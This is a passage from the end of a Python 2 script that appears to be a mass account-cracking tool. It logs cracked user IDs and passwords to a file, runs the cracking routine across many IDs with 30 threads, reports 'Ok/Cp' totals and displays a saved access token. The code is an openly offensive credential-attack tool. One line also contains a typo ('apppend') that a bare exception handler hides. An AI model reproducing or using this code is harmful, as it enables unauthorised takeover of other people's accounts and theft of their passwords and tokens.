                                                                                            cp.write(uid + ' | ' + pass20 + '\n')
                                                                                            cp.close()
                                                                                            cps.apppend(uid + pass20)
                                                    
        except:
            pass
        
 
 
    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \033[1;92mCrack Done'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' \033[0;96mPress enter to back')
    menu_s()
def v_tok():
    os.system("clear")
    print banner
    print("")
    os.system("cat access_token.txt")
    print("")
    raw_input(" Press enter to main menu ")
    menu_s()
 
 
if __name__ == '__main__':
    reg()
 
